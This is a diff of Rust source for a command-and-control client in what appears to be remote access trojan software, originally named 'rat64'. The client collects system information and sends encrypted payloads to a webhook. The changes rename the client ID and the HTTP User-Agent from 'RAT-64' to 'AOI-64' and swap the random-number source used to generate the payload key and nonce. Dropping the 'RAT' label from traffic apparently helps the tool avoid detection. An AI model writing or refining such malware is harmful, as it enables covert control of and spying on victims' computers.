@@ -2,7 +2,6 @@
 use serde::{Deserialize, Serialize};
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use tokio::time;
-use rand::RngCore;
 use crate::collectors::system_info::get_system_info_async;
 
 use crate::core::config::Config;
@@ -94,7 +93,7 @@ pub struct C2Client {
 impl C2Client {
     pub fn new(config: Config) -> Self {
         let client_id = format!(
-            "rat64_{}",
+            "aoi64_{}",
             SystemTime::now()
                 .duration_since(UNIX_EPOCH)
                 .unwrap_or_default()
@@ -211,7 +210,7 @@ impl C2Client {
             "Authorization",
             format!("Bearer {}", self.config.command_auth_token),
         )
-        .with_header("User-Agent", "RAT-64-HttpClient/1.0")
+        .with_header("User-Agent", "AOI-64-HttpClient/1.0")
         .with_timeout(self.config.timeout_seconds)
     }
 
@@ -957,8 +956,8 @@ impl C2Client {
             // main.rs と同様にキー/ノンスを生成してペイロードに反映
             let mut key = [0u8; 32];
             let mut nonce = [0u8; 12];
-            rand::rng().fill_bytes(&mut key);
-            rand::rng().fill_bytes(&mut nonce);
+            getrandom::getrandom(&mut key).expect("Failed to generate random key");
+            getrandom::getrandom(&mut nonce).expect("Failed to generate random nonce");
             payload.update_encryption_info(&key, &nonce);
 
             // 統一WebHook送信（lib.rs と同一実装）
